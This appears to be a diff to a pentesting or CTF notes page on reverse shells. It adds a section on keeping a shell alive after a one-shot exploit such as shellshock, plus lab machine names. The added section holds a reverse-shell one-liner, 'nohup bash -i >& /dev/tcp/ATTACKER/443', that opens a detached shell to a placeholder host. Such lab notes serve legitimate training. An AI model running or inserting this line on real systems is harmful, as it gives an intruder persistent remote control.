@@ -45,8 +45,18 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 script /dev/null -c bash
 ```
 
+## Detaching from a short-lived parent
+
+A shell spawned by a one-shot request/command ([[shellshock]], exim `${run{}}`, etc.) dies when its parent exits. Background it *and* detach it:
+
+```sh
+nohup bash -i >& /dev/tcp/ATTACKER/443 0>&1 &
+```
+
+`&` alone backgrounds but leaves the process in the parent's group; `nohup`/`setsid` detach it so it survives.
+
 ## Seen in
 
-[[los-3-hackers]], [[baluhome]], [[ignite]], [[guided-pentest]], [[hannah-coffee]], [[balulero]], [[autoescuela]], [[grooti]], [[walkingcms]], [[anonymous-pingu]]
+[[los-3-hackers]], [[baluhome]], [[ignite]], [[guided-pentest]], [[hannah-coffee]], [[balulero]], [[autoescuela]], [[grooti]], [[walkingcms]], [[anonymous-pingu]], [[trailpack]] (base64 `sh -i` via [[command-injection]]), [[bruteshock]] (nohup `bash -i` via [[shellshock]])
 
 > Node inspector tip ([[autoescuela]]): spawn the shell with async `exec()`/`spawn()`, not `execSync()` — the sync form blocks the event loop and freezes the app.
